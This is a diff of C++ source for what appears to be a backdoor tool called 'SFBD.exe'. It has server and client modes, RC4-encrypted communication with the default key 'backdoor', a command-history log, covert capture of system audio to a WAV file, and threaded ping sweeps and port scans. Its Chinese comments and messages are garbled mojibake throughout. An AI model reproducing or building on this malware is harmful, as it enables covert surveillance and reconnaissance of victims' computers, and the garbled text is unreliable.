@@ -4,6 +4,7 @@
 bool Config::enable_log = true;
 string Config::key = "backdoor";
 string Config::encry_mode = "rc4";
+string Config::logfile = "SFBD.history";
 
 
 int main(int argc, char* argv[]) {
@@ -17,7 +18,7 @@ Args::Args(int args_count, char* args_text[], Config& c) {
         if (c.enable_localarg) this->localarg(c, c.argfile);
 }
 
-//±¾µØÎÄ¼şÈ¡²ÎÊı
+//æœ¬åœ°æ–‡ä»¶å–å‚æ•°
 void Args::localarg(Config& c, string argfile) {
     fstream file(argfile, ios::in);
     static char** aa = new char* [50];
@@ -82,21 +83,21 @@ void Args::match(Config& c, int args_count, char* args_text[]) {
 void Args::all_help() {
     string header = "usage: SFBD.exe [-h] [--server/--client] <--option>\n";
     string content = "detail:\n";
-    content += "\t--server\t\t¿ªÆô·şÎñ¶ËÄ£Ê½\n";
-    content += "\t--client\t\t¿ªÆô¿Í»§¶ËÄ£Ê½\n";
-    content += "\t--listen-port\t\tĞŞ¸Ä·şÎñ¶ËÄ£Ê½ÏÂµÄ¼àÌı¶Ë¿Ú£¬Ä¬ÈÏÎª5180\n";
-    content += "\t--max-conn\t\tĞŞ¸Ä·şÎñ¶ËÄ£Ê½ÏÂ»á»°µÄ×î´óÁ¬½ÓÊı£¬Ä¬ÈÏÎª10\n";
-    content += "\t--host\t\t\tÖ¸¶¨·şÎñ¶ËIPÓÃÓÚÁ¬½Ó£¬Ä¬ÈÏ127.0.0.1\n";
-    content += "\t--conn-port\t\tÖ¸¶¨·şÎñ¶ËµÄ¶Ë¿ÚºÅÓÃÓÚÁ¬½Ó£¬Ä¬ÈÏ5180\n";
-    content += "\t--enc-mode <rc4/rot>\tÖ¸¶¨Í¨ĞÅ¼ÓÃÜÄ£Ê½£¬Ä¬ÈÏÎªrc4\n";
-    content += "\t--passwd\t\tÖ¸¶¨Í¨ĞÅ¼ÓÃÜÊ±Ê¹ÓÃµÄÃÜÔ¿£¬Ä¬ÈÏÎªbackdoor\n";
-    content += "\t--bufsize\t\tÖ¸¶¨½ÓÊÜÏûÏ¢µÄ»º³åÇø´óĞ¡£¨×Ö½Ú£©£¬Ä¬ÈÏÎª51800\n";
-    content += "\t--log\t\t\t¿ªÆôÃüÁîÈÕÖ¾²¢Ö¸¶¨ÈÕÖ¾ÎÄ¼şÃû\n";
+    content += "\t--server\t\tå¼€å¯æœåŠ¡ç«¯æ¨¡å¼\n";
+    content += "\t--client\t\tå¼€å¯å®¢æˆ·ç«¯æ¨¡å¼\n";
+    content += "\t--listen-port\t\tä¿®æ”¹æœåŠ¡ç«¯æ¨¡å¼ä¸‹çš„ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ä¸º5180\n";
+    content += "\t--max-conn\t\tä¿®æ”¹æœåŠ¡ç«¯æ¨¡å¼ä¸‹ä¼šè¯çš„æœ€å¤§è¿æ¥æ•°ï¼Œé»˜è®¤ä¸º10\n";
+    content += "\t--host\t\t\tæŒ‡å®šæœåŠ¡ç«¯IPç”¨äºè¿æ¥ï¼Œé»˜è®¤127.0.0.1\n";
+    content += "\t--conn-port\t\tæŒ‡å®šæœåŠ¡ç«¯çš„ç«¯å£å·ç”¨äºè¿æ¥ï¼Œé»˜è®¤5180\n";
+    content += "\t--enc-mode <rc4/rot>\tæŒ‡å®šé€šä¿¡åŠ å¯†æ¨¡å¼ï¼Œé»˜è®¤ä¸ºrc4\n";
+    content += "\t--passwd\t\tæŒ‡å®šé€šä¿¡åŠ å¯†æ—¶ä½¿ç”¨çš„å¯†é’¥ï¼Œé»˜è®¤ä¸ºbackdoor\n";
+    content += "\t--bufsize\t\tæŒ‡å®šæ¥å—æ¶ˆæ¯çš„ç¼“å†²åŒºå¤§å°ï¼ˆå­—èŠ‚ï¼‰ï¼Œé»˜è®¤ä¸º51800\n";
+    content += "\t--log\t\t\tå¼€å¯å‘½ä»¤æ—¥å¿—å¹¶æŒ‡å®šæ—¥å¿—æ–‡ä»¶å\n";
     cout << header << content << endl;
 }
 
 
-//ÉèÖÃ»ù´¡±äÁ¿,ÒôÆµ¸ñÊ½ĞÅÏ¢
+//è®¾ç½®åŸºç¡€å˜é‡,éŸ³é¢‘æ ¼å¼ä¿¡æ¯
 WavWriter::WavWriter(WAVEFORMATEX* fm, string filename) {
     subchunk1Size = (unsigned int)sizeof(*fm) + fm->cbSize;
     fmt = new unsigned char[subchunk1Size];
@@ -105,22 +106,22 @@ WavWriter::WavWriter(WAVEFORMATEX* fm, string filename) {
     this->filename = filename;
 }
 
-//ÊÍ·Å×ÊÔ´
+//é‡Šæ”¾èµ„æº
 WavWriter::~WavWriter() { delete fmt; }
 
-//³õÊ¼»¯,´´½¨wavÎÄ¼ş²¢ÁÙÊ±Ìî³äwavÎÄ¼şÍ·(Õ¼Î»)
+//åˆå§‹åŒ–,åˆ›å»ºwavæ–‡ä»¶å¹¶ä¸´æ—¶å¡«å……wavæ–‡ä»¶å¤´(å ä½)
 void WavWriter::init() {
     file.open(filename, ofstream::binary);
     for (int i = 0; i < 44; ++i) file.write((char*)"", 1);
 }
 
-//Ğ´ÈëÒôÆµÊı¾İ
+//å†™å…¥éŸ³é¢‘æ•°æ®
 void WavWriter::write(BYTE* data, int length) {
     file.write((char*)data, length * blockAlign);
     file.flush();
 }
 
-//ÌîĞ´wavÎÄ¼şÍ·ĞÅÏ¢(ĞèÒªÌîĞ´Ö÷ÌåÄÚÈİ²ÅÄÜ¼ÆËãÎÄ¼şÍ·ÖĞµÄĞÅÏ¢)²¢¹Ø±ÕÎÄ¼ş
+//å¡«å†™wavæ–‡ä»¶å¤´ä¿¡æ¯(éœ€è¦å¡«å†™ä¸»ä½“å†…å®¹æ‰èƒ½è®¡ç®—æ–‡ä»¶å¤´ä¸­çš„ä¿¡æ¯)å¹¶å…³é—­æ–‡ä»¶
 void WavWriter::close() {
     int len = file.tellp();
     subchunk2Size = len - (subchunk1Size + 28);
@@ -143,13 +144,13 @@ void WavWriter::close() {
     file.close();
 }
 
-//¹¹Ôìº¯Êı,Ö¸¶¨Â¼ÒôÎÄ¼şÃû,Ö¸¶¨Â¼ÖÆÊ±³¤
+//æ„é€ å‡½æ•°,æŒ‡å®šå½•éŸ³æ–‡ä»¶å,æŒ‡å®šå½•åˆ¶æ—¶é•¿
 AudioCapture::AudioCapture(string filename, int time) {
     this->cap_time = time;
     this->filename = filename;
 }
 
-//Îö¹¹º¯Êı,ÊÍ·Å¶ÑÇøÄÚ´æ
+//ææ„å‡½æ•°,é‡Šæ”¾å †åŒºå†…å­˜
 AudioCapture::~AudioCapture() {
     delete wav_file;
     CoTaskMemFree(pwfx);
@@ -160,91 +161,91 @@ AudioCapture::~AudioCapture() {
     CoUninitialize();
 }
 
-//³õÊ¼»¯ËùÓĞÒôÆµ²¶»ñ»ù´¡²½Öè
+//åˆå§‹åŒ–æ‰€æœ‰éŸ³é¢‘æ•è·åŸºç¡€æ­¥éª¤
 string AudioCapture::init() {
-    //µ¥Ïß³Ì·½Ê½´´½¨COM¶ÔÏó
+    //å•çº¿ç¨‹æ–¹å¼åˆ›å»ºCOMå¯¹è±¡
     hr = CoInitialize(NULL);
-    if (FAILED(hr)) return "´´½¨COM¶ÔÏóÊ§°Ü\n";
+    if (FAILED(hr)) return "åˆ›å»ºCOMå¯¹è±¡å¤±è´¥\n";
 
-    //´´½¨×é¼ş,Ö¸¶¨CLSID(Àà±êÊ¶·û),±íÊ¾´Ë¶ÔÏó²»ÊÇ¾ÛºÏÊ½¶ÔÏóµÄÒ»²¿·Ö,
-    //Ö¸¶¨×é¼şÀà±ğ,Ö¸¶¨×é¼ş½Ó¿ÚIID(½Ó¿Ú±êÊ¶·û),ÓÃÓÚ·µ»Ø´Ë½Ó¿ÚµÄÖ¸Õë
+    //åˆ›å»ºç»„ä»¶,æŒ‡å®šCLSID(ç±»æ ‡è¯†ç¬¦),è¡¨ç¤ºæ­¤å¯¹è±¡ä¸æ˜¯èšåˆå¼å¯¹è±¡çš„ä¸€éƒ¨åˆ†,
+    //æŒ‡å®šç»„ä»¶ç±»åˆ«,æŒ‡å®šç»„ä»¶æ¥å£IID(æ¥å£æ ‡è¯†ç¬¦),ç”¨äºè¿”å›æ­¤æ¥å£çš„æŒ‡é’ˆ
     hr = CoCreateInstance(CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, IID_IMMDeviceEnumerator, (void**)&pEnumerator);
-    if (FAILED(hr)) return "´´½¨×é¼şÊ§°Ü\n";
+    if (FAILED(hr)) return "åˆ›å»ºç»„ä»¶å¤±è´¥\n";
 
-    //»ñÈ¡Ä¬ÈÏÒôÆµÊä³ö¶Ëµã,±íÊ¾äÖÈ¾Éè±¸µÄÊı¾İÁ÷·½Ïò,Ö¸¶¨¶ËµãÉè±¸µÄ½ÇÉ«Îª¶àÃ½Ìå,
-    //Ö¸¶¨·µ»ØÒôÆµ¶ËµãÉè±¸¶ÔÏó½Ó¿ÚµÄÖ¸Õë
+    //è·å–é»˜è®¤éŸ³é¢‘è¾“å‡ºç«¯ç‚¹,è¡¨ç¤ºæ¸²æŸ“è®¾å¤‡çš„æ•°æ®æµæ–¹å‘,æŒ‡å®šç«¯ç‚¹è®¾å¤‡çš„è§’è‰²ä¸ºå¤šåª’ä½“,
+    //æŒ‡å®šè¿”å›éŸ³é¢‘ç«¯ç‚¹è®¾å¤‡å¯¹è±¡æ¥å£çš„æŒ‡é’ˆ
     hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
-    if (FAILED(hr)) return "»ñÈ¡Ä¬ÈÏÒôÆµÉè±¸Ê§°Ü\n";
+    if (FAILED(hr)) return "è·å–é»˜è®¤éŸ³é¢‘è®¾å¤‡å¤±è´¥\n";
 
-    //´´½¨¾ßÓĞÖ¸¶¨½Ó¿ÚµÄCOM¶ÔÏó           
+    //åˆ›å»ºå…·æœ‰æŒ‡å®šæ¥å£çš„COMå¯¹è±¡           
     hr = pDevice->Activate(IID_IAudioClient, CLSCTX_ALL, NULL, (void**)&pAudioClient);
-    if (FAILED(hr)) return "¼¤»îCOM¶ÔÏóÊ§°Ü\n";
+    if (FAILED(hr)) return "æ¿€æ´»COMå¯¹è±¡å¤±è´¥\n";
 
-    //»ñÈ¡ÒôÆµÁ÷¸ñÊ½
+    //è·å–éŸ³é¢‘æµæ ¼å¼
     hr = pAudioClient->GetMixFormat(&pwfx);
-    if (FAILED(hr)) return "»ñÈ¡ÒôÆµÁ÷¸ñÊ½Ê§°Ü\n";
+    if (FAILED(hr)) return "è·å–éŸ³é¢‘æµæ ¼å¼å¤±è´¥\n";
 
     wav_file = new WavWriter(pwfx, filename);
     hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, hnsRequestedDuration, 0, pwfx, NULL);
-    if (FAILED(hr)) return "³õÊ¼»¯ÒôÆµ¿Í»§¶ËÊ§°Ü\n";
+    if (FAILED(hr)) return "åˆå§‹åŒ–éŸ³é¢‘å®¢æˆ·ç«¯å¤±è´¥\n";
 
-    //»ñÈ¡·ÖÅäµÄ»º³åÇøµÄ´óĞ¡
+    //è·å–åˆ†é…çš„ç¼“å†²åŒºçš„å¤§å°
     hr = pAudioClient->GetBufferSize(&bufferFrameCount);
-    if (FAILED(hr)) return "»ñÈ¡·ÖÅäµÄ»º³åÇøÊ§°Ü\n";
+    if (FAILED(hr)) return "è·å–åˆ†é…çš„ç¼“å†²åŒºå¤±è´¥\n";
 
-    //Ö¸¶¨×é¼ş½Ó¿ÚIID,Ö¸¶¨ÒôÆµ¿Í»§¶Ë
+    //æŒ‡å®šç»„ä»¶æ¥å£IID,æŒ‡å®šéŸ³é¢‘å®¢æˆ·ç«¯
     hr = pAudioClient->GetService(IID_IAudioCaptureClient, (void**)&pCaptureClient);
-    if (FAILED(hr)) return "»ñÈ¡·şÎñÊ§°Ü\n";
+    if (FAILED(hr)) return "è·å–æœåŠ¡å¤±è´¥\n";
 
-    //¼ÆËã·ÖÅäµÄ»º³åÇøµÄÊµ¼Ê³ÖĞøÊ±¼ä
+    //è®¡ç®—åˆ†é…çš„ç¼“å†²åŒºçš„å®é™…æŒç»­æ—¶é—´
     // REFTIMES_PER_SEC = 10000000
     hnsActualDuration = (double)10000000 * bufferFrameCount / pwfx->nSamplesPerSec;
-    return "³õÊ¼»¯³É¹¦";
+    return "åˆå§‹åŒ–æˆåŠŸ";
 }
 
-//³ÖĞø²¶»ñÒôÆµÖ±µ½±»µ÷ÓÃ²ÅÍ£Ö¹,¶ÀÁ¢Ïß³Ì
+//æŒç»­æ•è·éŸ³é¢‘ç›´åˆ°è¢«è°ƒç”¨æ‰åœæ­¢,ç‹¬ç«‹çº¿ç¨‹
 string AudioCapture::Recording() {
     string result = this->init() + "\n";
     wav_file->init();
-    //¿ªÊ¼Â¼Òô
+    //å¼€å§‹å½•éŸ³
     hr = pAudioClient->Start();
-    if (FAILED(hr)) return "Æô¶¯Â¼ÒôÊ§°Ü";
+    if (FAILED(hr)) return "å¯åŠ¨å½•éŸ³å¤±è´¥";
 
     clock_t kopen = clock();
-    //ËÀÑ­»·,Ö±µ½Êµ¼ÊÂ¼ÖÆÊ±³¤´óÓÚÒªÇóµÄÂ¼ÖÆÊ±³¤
+    //æ­»å¾ªç¯,ç›´åˆ°å®é™…å½•åˆ¶æ—¶é•¿å¤§äºè¦æ±‚çš„å½•åˆ¶æ—¶é•¿
     while (true) {
-        //Ë¯ÃßÒÔ³ÖĞøµÈ´ıÌîÂúÒ»°ëµÄ»º³åÇø
+        //ç¡çœ ä»¥æŒç»­ç­‰å¾…å¡«æ»¡ä¸€åŠçš„ç¼“å†²åŒº
         //REFTIMES_PER_MILLISEC = 10000
         Sleep(hnsActualDuration / 10000 / 2);
-        //½øÈëÑ­»·ÌåÁ÷³Ì
+        //è¿›å…¥å¾ªç¯ä½“æµç¨‹
         hr = pCaptureClient->GetNextPacketSize(&packetLength);
-        if (FAILED(hr)) "»ñÈ¡ÏÂÒ»¸öÊı¾İ°ü´óĞ¡Ê§°Ü(Ñ­»·ÌåÍâ)";
+        if (FAILED(hr)) "è·å–ä¸‹ä¸€ä¸ªæ•°æ®åŒ…å¤§å°å¤±è´¥(å¾ªç¯ä½“å¤–)";
 
         while (packetLength != 0) {
-            //»ñÈ¡¹²Ïí»º³åÇøÖĞµÄ¿ÉÓÃÊı¾İ
+            //è·å–å…±äº«ç¼“å†²åŒºä¸­çš„å¯ç”¨æ•°æ®
             hr = pCaptureClient->GetBuffer(&pData, &numFramesAvailable, &flags, NULL, NULL);
-            if (FAILED(hr)) return "»ñÈ¡¹²Ïí»º³åÇøÊ§°Ü";
+            if (FAILED(hr)) return "è·å–å…±äº«ç¼“å†²åŒºå¤±è´¥";
 
             wav_file->write(pData, numFramesAvailable);
             hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
-            if (FAILED(hr)) return"ÊÍ·Å»º³åÇøÊ§°Ü";
+            if (FAILED(hr)) return"é‡Šæ”¾ç¼“å†²åŒºå¤±è´¥";
 
-            //ÍË³öÑ­»·ÌåÁ÷³Ì
+            //é€€å‡ºå¾ªç¯ä½“æµç¨‹
             hr = pCaptureClient->GetNextPacketSize(&packetLength);
-            if (FAILED(hr)) return "»ñÈ¡ÏÂÒ»¸öÊı¾İ°ü´óĞ¡Ê§°Ü(Ñ­»·ÌåÄÚ)";
+            if (FAILED(hr)) return "è·å–ä¸‹ä¸€ä¸ªæ•°æ®åŒ…å¤§å°å¤±è´¥(å¾ªç¯ä½“å†…)";
         }
-        //ÅĞ¶ÏÂ¼ÖÆÊ±³¤
+        //åˆ¤æ–­å½•åˆ¶æ—¶é•¿
         int ktime = (double(clock() - kopen) / CLOCKS_PER_SEC) * 1000;
         if (ktime > (cap_time * 1000))  break;
     }
-    //Í£Ö¹²¢½áÊø
+    //åœæ­¢å¹¶ç»“æŸ
     wav_file->close();
     hr = pAudioClient->Stop();
-    if (FAILED(hr)) return "Í£Ö¹Â¼ÒôÆ÷Ê§°Ü";
-    return result + "Â¼ÖÆÍê³É";
+    if (FAILED(hr)) return "åœæ­¢å½•éŸ³å™¨å¤±è´¥";
+    return result + "å½•åˆ¶å®Œæˆ";
 }
 
-//PINGÉ¨ÃèÏß³Ì
+//PINGæ‰«æçº¿ç¨‹
 DWORD WINAPI ICMPthread(void* args) {
     ThreadArgs* t = (ThreadArgs*)args;
     string output;
@@ -252,19 +253,19 @@ DWORD WINAPI ICMPthread(void* args) {
 
     while (true) {
         t->mtx.lock();
-        //ÔÚÍ£Ö¹Ç°Ìí¼ÓÉÏ´ÎµÄÊä³öÊı¾İ
+        //åœ¨åœæ­¢å‰æ·»åŠ ä¸Šæ¬¡çš„è¾“å‡ºæ•°æ®
         t->result += output;
         output = "";
-        //Îª¿ÕÔòÍ£Ö¹
+        //ä¸ºç©ºåˆ™åœæ­¢
         if (t->IPlist.empty()) {
             t->mtx.unlock();
             break;
         }
-        //È¡¶ÓÁĞÊ×¸öÔªËØ²¢³ö¶Ó
+        //å–é˜Ÿåˆ—é¦–ä¸ªå…ƒç´ å¹¶å‡ºé˜Ÿ
         string ip = t->IPlist.front();
         t->IPlist.pop();
         t->mtx.unlock();
-        //½øĞĞping
+        //è¿›è¡Œping
         string tmp = cont.Ping_Host(ip, t->TimeOut);
         if (!tmp.compare("alive"))
             output += "ip " + ip + " is alive!\n";
@@ -273,7 +274,7 @@ DWORD WINAPI ICMPthread(void* args) {
     return 0;
 }
 
-//¶Ë¿ÚÉ¨ÃèÏß³Ì
+//ç«¯å£æ‰«æçº¿ç¨‹
 DWORD WINAPI PORTthread(void* args) {
     ThreadArgs* t = (ThreadArgs*)args;
     string output;
@@ -281,23 +282,23 @@ DWORD WINAPI PORTthread(void* args) {
 
     while (true) {
         t->mtx.lock();
-        //ÔÚÍ£Ö¹Ç°Ìí¼ÓÉÏ´ÎµÄÊä³öÊı¾İ
+        //åœ¨åœæ­¢å‰æ·»åŠ ä¸Šæ¬¡çš„è¾“å‡ºæ•°æ®
         t->result += output;
         output = "";
-        //Îª¿ÕÔòÍ£Ö¹
+        //ä¸ºç©ºåˆ™åœæ­¢
         if (t->IPlist.empty()) {
             t->mtx.unlock();
             break;
         }
-        //È¡¶ÓÁĞÊ×¸öÔªËØ²¢³ö¶Ó
+        //å–é˜Ÿåˆ—é¦–ä¸ªå…ƒç´ å¹¶å‡ºé˜Ÿ
         string ip = t->IPlist.front();
         t->IPlist.pop();
         t->mtx.unlock();
-        //µİÔö±¬ÆÆ¶Ë¿Ú£¬¼ÇÂ¼Êı¾İ
+        //é€’å¢çˆ†ç ´ç«¯å£ï¼Œè®°å½•æ•°æ®
         for (int i = t->StartPort; i < t->EndPort; i++) {
             string tmp = cont.Port_Scan(ip, i, t->TimeOut);
             if (!tmp.compare("open")) {
-                output += "IP " + ip + " ¶Ë¿Ú " + to_string(i) + " ¿ª·Å\n";
+                output += "IP " + ip + " ç«¯å£ " + to_string(i) + " å¼€æ”¾\n";
             }
         }
     }
